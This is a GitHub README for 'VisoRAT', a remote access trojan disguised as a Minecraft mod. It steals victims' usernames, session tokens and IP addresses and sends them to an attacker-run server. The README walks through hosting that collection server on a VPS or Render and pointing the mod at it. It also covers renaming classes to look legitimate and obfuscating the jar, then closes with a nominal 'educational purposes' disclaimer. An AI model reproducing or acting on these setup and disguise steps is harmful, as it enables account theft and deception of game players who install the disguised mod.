# VisoRAT

![BigAhhRAT](https://github.com/VisoXC/VisoRAT/blob/main/assets/bigrat.png?raw=true)

> Since there are not enough RATs in the minecraft community here is another one 🙃
###### Sneaky shout-out to the [Ratter Scanner](https://ratterscanner.com/) team for being goated 

# Features

- Has It's own server
   - Webhook undeletable
   - Spam protection
   - Data validation
   - Configurable, no watermark

- Grabs
   - Username
   - Session ID (aka. Token)
   - IP Adress

- Lightweight

# Screenshot
![Screenshot](https://github.com/VisoXC/VisoRAT/blob/main/assets/embed.png?raw=true)

# Setup
## Server
Host on a VPS
   1. Download the repository
   2. Put everything inside the `server` folder in any directory on your VPS
   3. Edit `server/config.json` to your liking
   4. Install python/pip and all the requirements from `server/requirements.txt`
   5. Run `server/server.py`
#### OR
Host on [render](https://render.com)
   1. Make a private fork of this repository (Do NOT click fork on github, you have to download and reupload to a private repo)
   2. Edit `server/config.json` to your liking
   3. Create a new render account with the GitHub account you forked the repository with
   4. Create a new web service
   5. Select the forked repository
   6. Put in a name for the service, select main as the branch, `server` as the root directory, Python 3 as runtime, Build command `pip install -r requirements.txt` and Start command `python server.py` or `python3 server.py`
   7. Wait for the service to build
## Mod/Client
   1. Download the repository
   2. Change the Server IP in `scr/main/java/me/visoxd/VisoMod.java` to the IP of your VPS / URL of your render service
   3. Optional: Change the names of the classes/folders to make it look more legit
   4. Compile the mod (JDK 17 in your gradle settings and JDK 8 in your project settings)
#### OR
   1. Download the [release](https://github.com/VisoXC/VisoRAT/releases)
   2. Change the URL / IP of the mod to yours using a [java string editor](https://leonardosnt.github.io/jar-string-editor) or [Recaf](https://github.com/Col-E/Recaf/releases/tag/2.21.13) (Look for "http://127.0.0.1:5000/receive")
   3. Save and download the mod

   **Optional: Obfuscate the mod**

### If everything works for you please ⭐ this repo to support it ❤️
> Credits to [Schubilegend](https://github.com/schubilegend) for the tutorial shown above.

# DISCLAIMER 🚨
**I am not responsible for any damage caused by this program. This program was made for educational purposes ONLY.**
